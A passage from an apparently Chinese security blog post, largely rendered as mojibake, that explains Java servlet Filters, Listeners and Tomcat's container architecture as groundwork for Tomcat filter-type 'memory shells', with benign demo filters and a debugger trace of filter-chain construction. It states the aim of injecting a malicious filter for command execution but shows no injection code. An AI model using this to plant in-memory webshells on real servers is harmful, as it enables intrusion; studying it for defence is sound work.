resp.sendRedirect(request.getContextPath()+\u0026#34;/login.jsp\u0026#34;); return; } String username = session.getAttribute(\u0026#34;username\u0026#34;).toString(); if(\u0026#34;admin\u0026#34;.equals(username)){ filterChain.doFilter(servletRequest, servletResponse); }else{ resp.sendRedirect(request.getContextPath()+\u0026#34;/login.jsp\u0026#34;); } } @Override public void destroy() { } } ä¸Šè¿°ä»£ç å®ç°äº†å½“è®¿é—®/adminè·¯ç”±æ—¶ï¼Œä¼šå¯¹èº«ä»½è¿›è¡Œåˆ¤æ–­ä»è€Œå†³å®šæ˜¯å¦æ”¾è¡Œä»è€Œè°ƒç”¨åˆ°servletã€‚\nFilteré“¾ å½“å¤šä¸ª Filter åŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œç»„æˆäº†Filteré“¾ã€‚WebæœåŠ¡å™¨æ ¹æ®Filter åœ¨web.xmlæ–‡ä»¶ä¸­çš„æ³¨å†Œé¡ºåºï¼Œå†³å®šå…ˆè°ƒç”¨å“ªä¸ª Filterã€‚\nå½“ç¬¬ä¸€ä¸ª Filter çš„ doFilter æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼ŒwebæœåŠ¡å™¨ä¼šåˆ›å»ºä¸€ä¸ªä»£è¡¨ Filter é“¾çš„ FilterChain å¯¹è±¡ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œé€šè¿‡åˆ¤æ–­ FilterChain ä¸­æ˜¯å¦è¿˜æœ‰ Filter å†³å®šåé¢æ˜¯å¦è¿˜è°ƒç”¨ Filterã€‚\nå¦‚ä¸‹å›¾ï¼š\nListener Java Web å¼€å‘ä¸­çš„ç›‘å¬å™¨ï¼ˆListenerï¼‰å°±æ˜¯Applicationã€Session å’Œ Request ä¸‰å¤§å¯¹è±¡åˆ›å»ºã€é”€æ¯æˆ–è€…å¾€å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åŠŸèƒ½ç»„ä»¶ã€‚\næœ‰å¦‚ä¸‹ç›‘å¬å™¨ï¼š\nServletContextListennerï¼šå¯¹Servletä¸Šä¸‹æ–‡çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ ServletContextAttributeListenerï¼šç›‘å¬ Servlet ä¸Šä¸‹æ–‡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ HttpSessionListenerï¼šå¯¹Session çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚Sessioné”€æ¯æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ä¸ªæ˜¯Session è¶…æ—¶ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡è°ƒç”¨ Session å¯¹è±¡çš„ invalidate() æ–¹æ³•ä½¿ session å¤±æ•ˆã€‚ HttpSessionAttributeListenerï¼šå¯¹Sessionå¯¹è±¡ä¸­å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ï¼› ServletRequestListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡çš„åˆå§‹åŒ–å’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼› ServletRequestAttributeListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ã€‚ ç”¨é€”ï¼š å¯ä»¥ä½¿ç”¨ç›‘å¬å™¨ç›‘å¬å®¢æˆ·ç«¯çš„è¯·æ±‚ã€æœåŠ¡ç«¯çš„æ“ä½œç­‰ã€‚é€šè¿‡ç›‘å¬å™¨ï¼Œå¯ä»¥è‡ªåŠ¨è§¦å‘ä¸€äº›åŠ¨ä½œï¼Œæ¯”å¦‚ç›‘å¬åœ¨çº¿çš„ç”¨æˆ·æ•°é‡ï¼Œç»Ÿè®¡ç½‘ç«™è®¿é—®é‡ã€ç½‘ç«™è®¿é—®ç›‘æ§ç­‰ã€‚\nTomcatæ¶æ„ Tomcatè¯´æ˜ ä¸ApacheæœåŠ¡å™¨å¯¹æ¯”ä¸€ä¸‹ï¼š\nApacheæ˜¯webæœåŠ¡å™¨ï¼ˆé™æ€è§£æï¼Œå¦‚HTMLï¼‰ tomcat æ˜¯javaåº”ç”¨æœåŠ¡å™¨ï¼ˆåŠ¨æ€è§£æï¼Œå¦‚JSPï¼‰ è€ŒTomcatåªæ˜¯ä¸€ä¸ª servletå®¹å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´Servletæ˜¯ä¸€ç§æŠ€æœ¯å’Œè§„èŒƒï¼Œè€ŒTomcatæ˜¯å®ç°äº†Servletè§„èŒƒçš„å…·ä½“å®¹å™¨ã€‚\nApacheæ˜¯å¯ä»¥å’ŒTomcatè¿é€šçš„ï¼ŒApacheå¯ä»¥ä½œä¸ºwebæœåŠ¡å™¨çš„å‰ç«¯ï¼Œä¹Ÿå°±æ˜¯å½“å®¢æˆ·ç«¯è¯·æ±‚çš„æ˜¯é™æ€é¡µé¢ï¼Œåˆ™åªéœ€è¦ApacheæœåŠ¡å™¨å“åº”è¯·æ±‚ï¼Œå¦‚æœæ˜¯åŠ¨æ€çš„ï¼Œåˆ™æ˜¯Tomcatå“åº”è¯·æ±‚åå°†è§£æçš„JSPä»£ç ä¼ å›ç»™Apacheå†ä¼ å›ç»™å‰ç«¯ã€‚\næ‰€ä»¥tomcatæœåŠ¡å™¨æ˜¯å¯ä»¥ç‹¬ç«‹è¿è¡Œä¹Ÿå¯ä»¥å’ŒApacheè¿é€šè¿è¡Œã€‚\nTomcatæ¶æ„åŸç† tomcatæ¡†æ¶å¦‚ä¸‹æ‰€ç¤ºï¼Œä¸»è¦æœ‰serverã€serviceã€connectorã€container å››ä¸ªéƒ¨åˆ†ï¼š\næ ¸å¿ƒéƒ¨ä»¶å°±æ˜¯Connectorå’ŒContainerã€‚\nConnector ä¸»è¦è´Ÿè´£è¿›è¡ŒSocket é€šä¿¡ï¼ˆåŸºäºTCP/IPï¼‰ï¼Œç”¨äºè§£æHTTPæŠ¥æ–‡\nContainer åˆ™æ˜¯å¤„ç† Connector å‘æ¥çš„è¯·æ±‚ï¼Œå¤„ç†å†…éƒ¨äº‹åŠ¡ï¼ŒåŠ è½½å’Œç®¡ç†Servletï¼Œç”±Servlet å…·ä½“è´Ÿè´£å¤„ç† Request è¯·æ±‚ã€‚\nä¸‹é¢æ¥ç¨æ·±å…¥å­¦ä¹ ä¸€ä¸‹è¿™äº›ç»„ä»¶ã€‚\nserver å³æ•´ä¸ªTomcat æœåŠ¡å™¨ï¼Œä¸€ä¸ªtomcatåªæœ‰ä¸€ä¸ªServerï¼Œç”¨äºæä¾›å…·ä½“æœåŠ¡\nservice å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸€ä¸ªTomcat serverå¯ä»¥åŒ…å«å¤šä¸ªserviceï¼Œserviceä¸»è¦æ˜¯å…³è”Connector å’Œ Container ï¼ŒåŒæ—¶ä¼šåˆå§‹åŒ–å®ƒä¸‹é¢çš„å…¶ä»–ç»„ä»¶ã€‚\nä¸€ä¸ª Service å¯ä»¥è®¾ç½®å¤šä¸ª Connectorï¼Œä½†æ˜¯åªèƒ½æœ‰ä¸€ä¸ª Container å®¹å™¨ã€‚\nConnector Connectorç”¨äºè¿æ¥Serviceå’ŒContainerï¼Œè§£æå®¢æˆ·ç«¯çš„è¯·æ±‚å°è£…æˆRequestå¯¹è±¡å¹¶è½¬å‘åˆ°Containerï¼Œä»¥åŠè½¬å‘æ¥è‡ªContainerçš„å“åº”ã€‚æ¯ä¸€ç§ä¸åŒçš„Connectoréƒ½å¯ä»¥å¤„ç†ä¸åŒçš„è¯·æ±‚åè®®ï¼ŒåŒ…æ‹¬HTTP/1.1ã€HTTP/2ã€AJPç­‰ç­‰ã€‚\nContainer è´Ÿè´£å¤„ç†ç”¨æˆ·çš„Servletè¯·æ±‚ï¼Œå®ƒä¸»è¦æœ‰å››ç§å®¹å™¨ï¼Œåˆ†åˆ«æ˜¯Engineã€Hostã€Contextã€Wrapperã€‚\nå®ƒä»¬ä¹‹é—´æ˜¯å­˜åœ¨çˆ¶å­å…³ç³»çš„ã€‚\nå››ç§å®¹å™¨çš„ä½œç”¨ï¼š\nEngine å¯ä»¥çœ‹æˆæ˜¯å®¹å™¨å¯¹å¤–æä¾›åŠŸèƒ½çš„å…¥å£ï¼Œæ¯ä¸ªEngineæ˜¯Hostçš„é›†åˆï¼Œç”¨äºç®¡ç†å„ä¸ªHostï¼ŒEngineçš„å®ç°ç±»ä¸º org.apache.catalina.core.StandardEngineã€‚ Host å¯ä»¥çœ‹æˆä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œä¸€ä¸ªTomcatå¯ä»¥æ”¯æŒå¤šä¸ªè™šæ‹Ÿä¸»æœºã€‚è€Œä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸‹å¯åŒ…å«å¤šä¸ª Contextï¼ŒHostçš„å®ç°ç±»ä¸º org.apache.catalina.core.StandardHostã€‚ Context è¡¨ç¤ºä¸€ä¸ª Web åº”ç”¨ç¨‹åºï¼Œæ¯ä¸€ä¸ªContextéƒ½æœ‰å”¯ä¸€çš„pathï¼Œä¸€ä¸ªWebåº”ç”¨å¯åŒ…å«å¤šä¸ª Wrapperï¼ŒContextçš„å®ç°ç±»ä¸º org.apache.catalina.core.StandardContextã€‚ Wrapper è¡¨ç¤ºä¸€ä¸ªServletï¼Œè´Ÿè´£ç®¡ç†æ•´ä¸ª Servlet çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬è£…è½½ã€åˆå§‹åŒ–ã€èµ„æºå›æ”¶ç­‰ï¼ŒWrapperçš„å®ç°ç±»ä¸º org.apache.catalina.core.StandardWrapperã€‚ ç”¨ä¸€å¼ å›¾æ¥è¡¨ç¤ºï¼š\nWrapperç»„ä»¶ä¿å­˜äº†Webåº”ç”¨çš„é…ç½®ä¿¡æ¯ï¼ˆè¿™æ ·çœ‹æ¥å…¶å®å°±æ˜¯Contextå°±æ˜¯å¯¹åº”webappsä¸‹çš„ä¸åŒçš„åº”ç”¨ç¨‹åºï¼Œå…¶å®ç°çš„åŠŸèƒ½ä¸åŒï¼‰ã€‚\nå¹¶ä¸”ç»“åˆåˆ°java web ä¸‰å¤§ä»¶æ¥çœ‹ï¼Œåœ¨åˆ°è¾¾Contextåï¼Œå¯ä»¥è¯´listenerå’Œfilterå­˜åœ¨åœ¨contextä¸­ï¼Œè€Œservletå­˜åœ¨äºwrapperä¸­ã€‚\npipeline/valve pipelineä¸­æ–‡æ˜¯æµæ°´çº¿ï¼Œæ¯ä¸ªå®¹å™¨éƒ½æœ‰è‡ªå·±çš„pipelineï¼Œä»£è¡¨ä¸€ä¸ªå®Œæˆä»»åŠ¡çš„ç®¡é“ã€‚æµæ°´çº¿ä¸Šé¢æœ‰å¾ˆå¤šä»»åŠ¡ï¼Œå…·ä½“ä»»åŠ¡æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå°±æ˜¯Valveï¼Œä¸­æ–‡åå­—æ˜¯é˜€ã€‚å…¶ä¸­Pipelineå’ŒValveéƒ½æ˜¯æ¥å£ï¼Œå¯¹äºPipelineæœ‰ä¸€ä¸ªæ ‡å‡†å®ç°StandardPipelineã€‚å¯¹äºValveä¸åŒçš„å®¹å™¨æœ‰å®ƒè‡ªå·±çš„å®ç°ï¼Œæ¯”å¦‚StandardWrapperå®¹å™¨å®ç°çš„StandardWrapperValve\nå†…å­˜é©¬å­¦ä¹  Tomcatå†…å­˜é©¬çš„æ ¸å¿ƒåŸç†å°±æ˜¯åŠ¨æ€åœ°å°†æ¶æ„ç»„ä»¶æ·»åŠ åˆ°æ­£åœ¨è¿è¡Œçš„TomcatæœåŠ¡å™¨ä¸­ã€‚\nServletåœ¨3.0ç‰ˆæœ¬ä¹‹åèƒ½å¤Ÿæ”¯æŒåŠ¨æ€æ³¨å†Œç»„ä»¶ã€‚è€ŒTomcatç›´åˆ°7.xæ‰æ”¯æŒServlet3.0ï¼Œå› æ­¤é€šè¿‡åŠ¨æ€æ·»åŠ æ¶æ„ç»„ä»¶æ³¨å…¥å†…å­˜é©¬çš„æ–¹å¼é€‚åˆTomcat7.xåŠä»¥ä¸Šã€‚\nFilter å‹å†…å­˜é©¬ åœ¨å‰é¢æˆ‘ä»¬å­¦ä¹ äº†ä¸‰å¤§ä»¶ä¸­çš„Filterï¼ˆè¿‡æ»¤å™¨ï¼‰ï¼Œwebè¯·æ±‚éƒ½ä¼šç»è¿‡ filter ä¹‹åæ‰ä¼šåˆ° Servlet ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡è‡ªå®šä¹‰è¿‡æ»¤å™¨æ¥åšåˆ°å¯¹ç”¨æˆ·çš„ä¸€äº›è¯·æ±‚è¿›è¡Œæ‹¦æˆªä¿®æ”¹ç­‰æ“ä½œã€‚\né‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½åŠ¨æ€åˆ›å»º ä¸€ä¸ª filter å¹¶ä¸”å°†å…¶æ”¾åœ¨æœ€å‰é¢ï¼Œæˆ‘ä»¬çš„filter å°±ä¼šæœ€å…ˆæ‰§è¡Œï¼Œè¿™æ ·åªè¦æˆ‘ä»¬å¾€ filter ä¸­æ·»åŠ æ¶æ„ä»£ç ï¼Œå°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚\nç›¸å…³ç±»äº†è§£ **FilterDefsï¼š**å­˜æ”¾FilterrDefçš„æ•°ç»„ï¼ŒFilterDef ä¸­å­˜å‚¨ç€æˆ‘ä»¬è¿‡æ»¤å™¨åï¼Œè¿‡æ»¤å™¨å®ä¾‹ç­‰åŸºæœ¬ä¿¡æ¯ã€‚\nFilterConfigsï¼šå­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ FilterConfig ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯\nFilterMapsï¼šå­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨ FilterMap ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹åº”çš„URLPattern\nFilterChainï¼šè¿‡æ»¤å™¨é“¾ï¼Œè¯¥å¯¹è±¡ä¸Šçš„ doFilter æ–¹æ³•èƒ½ä¾æ¬¡è°ƒç”¨é“¾ä¸Šçš„ Filter\nApplicationFilterChainï¼šè°ƒç”¨è¿‡æ»¤å™¨é“¾\nApplicationFilterConfigï¼šè·å–è¿‡æ»¤å™¨\nApplicationFilterFactoryï¼šç»„è£…è¿‡æ»¤å™¨é“¾\nWebXmlï¼šå­˜æ”¾ web.xml ä¸­å†…å®¹çš„ç±»\nContextConfigï¼šWebåº”ç”¨çš„ä¸Šä¸‹æ–‡é…ç½®ç±»\nStandardContextï¼šContextæ¥å£çš„æ ‡å‡†å®ç°ç±»ï¼Œä¸€ä¸ª Context ä»£è¡¨ä¸€ä¸ª Web åº”ç”¨ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Wrapper\nFilteré“¾ æµç¨‹åˆ†æ ç¯å¢ƒï¼š\nTomcat 9.0.93 å…ˆä»¥å®ä¾‹ç®€å•çœ‹çœ‹Filteré“¾çš„æµç¨‹ï¼š åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ï¼Œå†…å®¹åˆ†åˆ«ä¸ºï¼š\nTestFilter.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package filter; import javax.servlet.*; import java.io.IOException; import org.apache.catalina.core.StandardWrapper; public class TestFilter implements Filter { public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\u0026#34;ç¬¬ä¸€ä¸ªFilter åˆå§‹åŒ–åˆ›å»º\u0026#34;); } public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { System.out.println(\u0026#34;ç¬¬ä¸€ä¸ªFilteræ‰§è¡Œè¿‡æ»¤æ“ä½œ\u0026#34;); filterChain.doFilter(servletRequest,servletResponse); } public void destroy() { } } TestDemo.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package filter; import javax.servlet.*; import java.io.IOException; public class TestDemo implements Filter { public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\u0026#34;ç¬¬äºŒä¸ªFilter åˆå§‹åŒ–åˆ›å»º\u0026#34;); } public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { System.out.println(\u0026#34;ç¬¬äºŒä¸ªFilteræ‰§è¡Œè¿‡æ»¤æ“ä½œ\u0026#34;); filterChain.doFilter(servletRequest,servletResponse); } public void destroy() { } } ç„¶åweb.xmlä¸­æ·»åŠ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;filter\u0026lt;/filter-name\u0026gt; \u0026lt;!--åå­— --\u0026gt; \u0026lt;filter-class\u0026gt;filter.TestFilter\u0026lt;/filter-class\u0026gt;\u0026lt;!--ä½ç½® --\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;filter\u0026lt;/filter-name\u0026gt;\u0026lt;!--è°ƒç”¨ --\u0026gt; \u0026lt;url-pattern\u0026gt;/filter\u0026lt;/url-pattern\u0026gt;\u0026lt;!--è¡¨ç¤ºè®¿é—®filterè·¯ç”±çš„webèµ„æºéƒ½æ˜¯è¢«æ‹¦æˆªï¼Œè€Œ/*è¡¨ç¤ºæ‰€æœ‰çš„URLéƒ½ä¼šè¢«æ‹¦æˆª --\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;filter1\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;filter.TestDemo\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;filter1\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/filter\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;/web-app\u0026gt; ç„¶åè¿è¡ŒtomcatæœåŠ¡å™¨ï¼Œè®¿é—®filterè·¯ç”±ï¼ŒæˆåŠŸè¾“å‡ºåœ¨æ§åˆ¶å°ä¸Šï¼š\nç°åœ¨è¿™é‡Œå°±å°è¯•ä¸€ä¸‹è°ƒè¯•ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nè¿™é‡Œéœ€è¦å¯¼å…¥catalina.jaråŒ…æ¥æ›´å¥½çœ‹ä¸€äº›ï¼Œè¿™ä¸ªåŒ…åœ¨tomcatçš„libç›®å½•ä¸‹ï¼Œç›´æ¥åœ¨ideaé‡Œé¢æ‹‰è¿›å»å³å¯ï¼š ç„¶åå°±å¯ä»¥äº†ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nç„¶åæˆ‘ä»¬åœ¨TestFilterr.javaçš„filterChainçš„doFilteræ‰“æ–­ç‚¹ï¼Œç„¶åå¼€å§‹è°ƒè¯•ã€‚\nå¼€å¯è°ƒè¯•åï¼Œå†è®¿é—®ä¸€ä¸‹ /filter å³å¯æˆåŠŸæ–­ä¸Šï¼š\nçœ‹ä¸€ä¸‹è¿™é‡Œçš„å‚æ•°æƒ…å†µï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸‰ä¸ªfilterï¼Œè¿™é‡Œç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªfilteréƒ½æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„filterï¼Œç¬¬ä¸‰ä¸ªfilteræ˜¯tomcatè‡ªå¸¦çš„filterã€‚æ­¤æ—¶çš„filterChainä¸ºApplicationFilterChainç±»å®ä¾‹ï¼Œæ‰€ä»¥æ­¤æ—¶ä¼šè°ƒç”¨ApplicationFilterChainçš„doFilter()æ–¹æ³•ã€‚\nå•å‡»F7è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªfilterChainçš„doFilter()æ–¹æ³•ï¼š è¿™é‡Œçš„ifè¿›è¡Œäº†Globals.IS_SECIRITY_ENABLEDåˆ¤æ–­ï¼Œçœ‹æ˜¯å¦å¼€å¯äº†å…¨å±€å®‰å…¨æœåŠ¡ã€‚\nF7è¿›å…¥ä¸‹ä¸€æ­¥ï¼Œæ²¡æœ‰è¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼Œç›´æ¥åˆ°äº†elseå†…çš„ä»£ç ï¼š\nç„¶åè¿™é‡Œå°±ä¼šè°ƒç”¨ApplicationFilterChainçš„internalDoFilter()æ–¹æ³•ï¼š çœ‹å‚æ•°ï¼Œæ— ç–‘ä¼šè¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼Œåˆ©ç”¨ä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 if (this.pos \u0026lt; this.n) { ApplicationFilterConfig filterConfig = this.filters[this.pos++]; try { Filter filter = filterConfig.getFilter(); if (request.isAsyncSupported() \u0026amp;\u0026amp; !filterConfig.getFilterDef().getAsyncSupportedBoolean()) { request.setAttribute(\u0026#34;org.apache.catalina.ASYNC_SUPPORTED\u0026#34;, Boolean.FALSE); } if (Globals.IS_SECURITY_ENABLED) { Principal principal = ((HttpServletRequest)request).getUserPrincipal(); Object[] args = new Object[]{request, response, this}; SecurityUtil.doAsPrivilege(\u0026#34;doFilter\u0026#34;, filter, classType, args, principal); } else { filter.doFilter(request, response, this); } } ç„¶åå°±è°ƒç”¨äº†filterså˜é‡ï¼Œè¿™ä¸ªå˜é‡åœ¨ç±»ä¸­æ˜¯å®šä¹‰çš„äº†ï¼Œå¦‚ä¸‹ï¼š\nå¹¶ä¸”çœ‹æ­¤æ—¶çš„å˜é‡å¯¹åº”æƒ…å†µï¼š å’Œä¹‹å‰ä¸€æ ·ï¼Œæœ‰ä¸‰ä¸ªè¿‡æ»¤å™¨ã€‚ç„¶åç»§ç»­çœ‹ifæ¡ä»¶è¯­å¥é‡Œé¢çš„åˆ©ç”¨ä»£ç ï¼š æ­¤æ—¶posçš„å€¼ä¸º1ï¼Œå¹¶ä¸”è¿™é‡Œçš„pos++æ˜¯åç½®çš„ï¼Œæ‰€ä»¥ä¼šå…ˆè·å–åˆ°filtersæ•°ç»„ä¸‹æ ‡ä¸º1çš„filterï¼Œç„¶åå†+1ï¼Œæ‰€ä»¥æ­¤æ—¶ä¼šè·å–åˆ°æˆ‘ä»¬å®šä¹‰çš„ç¬¬äºŒä¸ªfilterã€‚\néªŒè¯æˆåŠŸã€‚\nç„¶åå°±æ˜¯è°ƒç”¨ getFilter()æ–¹æ³•è·å–åˆ°ç±»å®ä¾‹ï¼š ç„¶åè¿™é‡Œçš„ifæ¡ä»¶åŒæ ·ä¸ä¼šè¿›å…¥ï¼Œç›´æ¥è¿›å…¥elseè°ƒç”¨TestDemoçš„doFilter()æ–¹æ³•ï¼š é¡ºç†æˆç« ï¼Œç¬¬äºŒä¸ªè‡ªå®šä¹‰çš„TestDemoçš„doFilter()æ–¹æ³•æ˜¯åŒæ ·çš„ï¼Œç„¶åå°±ä¼šåˆ°Tomcatè‡ªå¸¦çš„filterï¼Œå³WsFilterï¼š äºæ˜¯è¿›å…¥åˆ°äº†WsFilterç±»çš„doFilter()æ–¹æ³•:\nè¿™é‡Œçš„ifæ¡ä»¶æ²¡æœ‰é€šè¿‡ï¼Œç›´æ¥è¿›å…¥elseè¯­å¥ï¼š è¿™é‡Œçš„chainç±»å®ä¾‹ä¸ºApplicationFilterChainï¼Œåˆä¼šè°ƒç”¨ä¸€æ¬¡doFilter()æ–¹æ³• ==ã€‹å†è°ƒç”¨internalDoFilter()æ–¹æ³•ï¼Œä½†æ˜¯æ­¤æ—¶åœ¨è¿™ä¸ªinternalFilter()æ–¹æ³•ä¸­ï¼Œå‰é¢æˆ‘ä»¬éƒ½æ˜¯æ»¡è¶³äº†è¿™ä¸ªifæ¡ä»¶ï¼š\nä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰æ»¡è¶³ï¼Œç›´æ¥è¿›å…¥elseè¯­å¥ï¼Œå†ç„¶åçš„ä¸€æ­¥ä¸€æ­¥çš„æ¡ä»¶åˆ¤æ–­ï¼Œæœ€åä¼šè°ƒç”¨servletçš„service()æ–¹æ³•ï¼š\nä¹Ÿå°±æ˜¯è¯´æœ€åä¸€ä¸ªFilterä¼šè°ƒç”¨service()æ–¹æ³•æ¥å¤„ç†webè¯·æ±‚ã€‚\nâ€”â€”â€”â€”â€”â€”\næ­£å‘åˆ†æfilteræµç¨‹åˆ†æç»“æŸã€‚\n/filterå‰æµç¨‹åˆ†æ åœ¨doFilter() æ–¹æ³•ä¹‹å‰ï¼Œæ•´ä¸ªæµç¨‹å¦‚å›¾ï¼š\nã€‚åœ¨å‰é¢æˆ‘ä»¬æ—¶ç›´æ¥åˆ†æçš„è®¿é—®filteré“¾ä¹‹åçš„è¿‡ç¨‹ï¼Œç°åœ¨å°±ä¸»è¦ç€é‡äºfiltersæ˜¯å¦‚ä½•è¢«èµ‹å€¼çš„ï¼š\nåœ¨å‰é¢ä¹Ÿåˆ†æè¿‡äº†ï¼Œå…¶å®è¿™é‡Œçš„filterrConfigå¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªfilterï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å°±çœ‹ä¸€ä¸‹è¿™ä¸ªfiltersæ˜¯å¦‚ä½•èµ‹å€¼çš„ï¼ˆè¿™ä¸ªfilterså³æ‰€å±ApplicationFilterChainç±»çš„å˜é‡ï¼‰ã€‚\nå‘ç°åœ¨ StandardWrapperValve ç±»çš„invokeæ–¹æ³•ä¸­æœ‰è¿™ä¸ªå®šä¹‰ï¼š\n1 ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); æ‰“æ–­ç‚¹è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªApplicationFilterFactoryç±»çš„createFilterChain()æ–¹æ³•ï¼š è¿™é‡Œè¿›å…¥åˆ°äº†elseè¯­å¥ï¼Œç„¶åç»§ç»­å°±æ˜¯èµ‹å€¼filterChainï¼š\nï¼ˆæ ‡çº¢çš„å³è¿›å…¥çš„è¯­å¥ï¼‰\nå¯ä»¥çœ‹åˆ°è¿™é‡Œç¡®å®å°†filterChainèµ‹å€¼ä¸ºäº† ApplicationFilterChainç±»çš„å®ä¾‹ã€‚\nä½†ç°åœ¨åªæ˜¯ä¸€ä¸ªç©ºçš„ApplicationFilterChainå¯¹è±¡ã€‚\nå†å¾€åçœ‹ï¼Œæœ‰å¦‚ä¸‹ä»£ç ï¼š\n1 2 StandardContext context = (StandardContext)wrapper.getParent(); FilterMap[] filterMaps = context.findFilterMaps(); è°ƒç”¨getParent()è·å–å½“å‰çš„Contextï¼Œä¹Ÿå°±æ˜¯å½“å‰çš„åº”ç”¨ï¼Œç„¶åä»Contextä¸­è·å–filterMapsï¼Œfiltermapså°±æ˜¯web.xmlä¸­æˆ‘ä»¬å†™å…¥çš„filterã€‚\nå†ç„¶åå°±æ˜¯éå†è¿™ä¸ªæ•°ç»„ä¸­çš„å€¼ï¼š\né‡ç‚¹éƒ½æ ‡å‡ºæ¥äº†ï¼Œè¿™é‡Œå°±æ˜¯éå†filterMapã€‚å†æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªforå¾ªç¯å…·ä½“ä»£ç ï¼š\nå¦‚æœå½“å‰è¯·æ±‚çš„urlä¸FilterMapä¸­çš„urlPatternåŒ¹é…ï¼Œå°±ä¼šè°ƒç”¨ findFilterConfig æ–¹æ³•åœ¨ filterConfigs ä¸­å¯»æ‰¾å¯¹åº” filterNameåç§°çš„ FilterConfigï¼Œç„¶åå¦‚æœä¸ä¸ºnullï¼Œå°±è¿›å…¥elseè¯­å¥ï¼Œå°†filterConfigæ·»åŠ åˆ°filterChainä¸­ï¼Œè·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªApplicationFilterChainç±»çš„addFIlter()æ–¹æ³•ï¼š å¾ˆæ˜æ˜¾å°±æ˜¯å°†filteréƒ½è£…è¿›å…ˆå‰å®šä¹‰çš„ApplicationFilterChainçš„filtersä¸­ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\nfilterChainå®ä¾‹èµ‹å€¼å¤§æ¦‚å°±æ˜¯è¿™æ ·ã€‚\næˆ‘ä»¬å†å›åˆ°StandardWrapperValveç±»ä¸­ï¼Œåœ¨invokeä¹‹åçš„ä»£ç ä¸­ï¼Œæœ‰è°ƒç”¨filterChain çš„ doFIlter() 